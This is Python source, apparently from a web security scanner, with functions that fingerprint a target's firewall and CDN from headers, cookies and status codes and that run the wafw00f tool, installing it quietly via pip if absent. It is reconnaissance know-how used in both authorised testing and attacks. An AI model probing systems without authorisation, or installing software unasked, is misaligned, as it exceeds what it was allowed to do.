def _detect_waf(responses: list[dict]) -> tuple[str, str]:
    all_headers: dict[str, str] = {}
    all_bodies: str = ""
    all_cookies: str = ""

    for r in responses:
        all_headers.update({k.lower(): v.lower() for k, v in r.get("headers", {}).items()})
        all_bodies += r.get("body", "").lower()
        # Extract Set-Cookie values for cookie-based detection
        for k, v in r.get("headers", {}).items():
            if k.lower() in ("set-cookie", "cookie"):
                all_cookies += v.lower() + " "

    for vendor, sigs in WAF_SIGNATURES.items():
        for h in sigs["headers"]:
            if h.lower() in all_headers:
                return vendor, f"header:{h}"
        for kw in sigs["body_kw"]:
            if kw in all_bodies:
                return vendor, f"body:{kw}"
        server_val = all_headers.get("server", "")
        for s in sigs["server"]:
            if s in server_val:
                return vendor, f"server:{s}"
        for ck in sigs.get("cookies", []):
            if ck.lower() in all_cookies:
                return vendor, f"cookie:{ck}"

    blocked = any(r.get("status") in BLOCK_CODES for r in responses)
    if blocked:
        return "Unknown WAF", "blocked-probe"
    return "None detected", ""


def _detect_cdn(headers: dict) -> str:
    lower = {k.lower(): v for k, v in headers.items()}
    server = lower.get("server", "")
    if "nginx" in server and "cloudflare" not in server:
        pass  # Nginx alone is not a CDN
    for cdn, sig_headers in CDN_SIGNATURES.items():
        for sh in sig_headers:
            if sh.lower() in lower:
                return cdn
    return "None detected"


def _detect_blocking_mode(responses: list[dict]) -> str:
    for r in responses:
        if r.get("status") in BLOCK_CODES:
            return "ACTIVE"
    return "PASSIVE (detection-only)"


def _run_wafw00f(target_url: str, timeout: int = 45,
                 logger: Optional[logging.Logger] = None) -> dict:
    """
    Run wafw00f for authoritative WAF identification.
    Auto-installs via pip if not found.
    """
    import re as _re
    import subprocess as _sub
    import sys as _sys

    result: dict = {"waf_names": [], "detected": False, "raw": "", "error": None}

    wafw00f_path = shutil.which("wafw00f")
    if not wafw00f_path:
        log("[wafw00f] not found — installing via pip...", "info", logger)
        _sub.run(
            [_sys.executable, "-m", "pip", "install", "wafw00f", "--quiet"],
            capture_output=True, text=True, timeout=90,
        )
        wafw00f_path = shutil.which("wafw00f")

    if not wafw00f_path:
        result["error"] = "wafw00f install failed"
        return result

    try:
        proc = _sub.run(
            [wafw00f_path, target_url],
            capture_output=True, text=True, timeout=timeout,
        )
        output = (proc.stdout or "") + (proc.stderr or "")

        # Strip ANSI escape codes — wafw00f colours its output
        ansi_esc = _re.compile(r'\x1b\[[0-9;]*[A-Za-z]')
        output_clean = ansi_esc.sub('', output)
        result["raw"] = output_clean[:1500]

        for line in output_clean.splitlines():
            # Matches: "is behind Azure Front Door (Microsoft) WAF."
            m = _re.search(r'is behind (.+?)\s+WAF', line, _re.IGNORECASE)
            if m:
                waf_name = m.group(1).strip().rstrip('.')
                if waf_name and waf_name not in result["waf_names"]:
                    result["waf_names"].append(waf_name)
                    result["detected"] = True

        if "no waf detected" in output_clean.lower():
            result["detected"] = False
            result["waf_names"] = []

    except subprocess.TimeoutExpired:
        result["error"] = f"timed out ({timeout}s)"
    except Exception as e:
        result["error"] = str(e)

    return result


